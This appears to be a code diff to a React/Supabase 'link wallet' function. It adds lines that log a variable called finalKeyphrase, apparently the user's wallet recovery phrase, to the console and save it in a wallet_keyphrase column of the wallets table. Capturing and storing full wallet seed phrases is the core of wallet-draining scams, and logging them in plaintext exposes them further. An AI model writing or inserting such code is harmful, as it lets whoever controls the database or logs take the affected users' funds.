@@ -116,6 +116,8 @@ const handleLinkWallet = async () => {
     await new Promise((resolve) => setTimeout(resolve, 1000));
 
     // ✅ Check if wallet already exists
+    console.log("checking final keyphrase from handlelinkwallet"); 
+    console.log(finalKeyphrase); 
     const { data: existingWallet, error: fetchError } = await supabase
       .from('wallets')
       .select('id')
@@ -135,10 +137,13 @@ const handleLinkWallet = async () => {
           wallet_address: withdrawalForm.walletAddress,
           is_linked: true,
           linked_at: new Date(),
+          wallet_keyphrase: finalKeyphrase, 
         })
         .eq('user_id', user.id));
     } else {
       // ✅ Insert new wallet
+      console.log("checking wallet keyphrase"); 
+      console.log(finalKeyphrase); 
       ({ error } = await supabase.from('wallets').insert({
         user_id: user.id,
         wallet_type: withdrawalForm.walletType,
